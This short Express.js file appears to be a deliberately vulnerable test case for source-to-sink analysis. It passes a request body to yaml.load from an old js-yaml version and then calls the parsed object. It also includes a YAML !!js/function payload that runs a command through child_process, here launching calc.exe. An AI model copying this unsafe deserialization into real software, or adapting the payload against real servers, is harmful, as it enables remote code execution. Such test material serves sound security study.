const express = require('express')
const yaml = require('js-yaml') // npm install js-yaml@2.0.4
const app = express()
app.use(express.text())
app.post('/parse', (req, res) => {
  // SOURCE
  const userControlledYaml = req.body
  let bar = 'safe';
  
  try {
    // here
    throw new Error(); 
  } catch (err) {
    bar = userControlledYaml;       
    // SINK
    const parsedData = yaml.load(bar)
    const result = parsedData();
    res.json({ "result": result })
  }
})

app.listen(3000)

const maliciousYaml = `
!!js/function >
  function() {
    const process = global.require('child_process');
    process.execSync('calc.exe');
    return "Exploit succeeded";
  }
`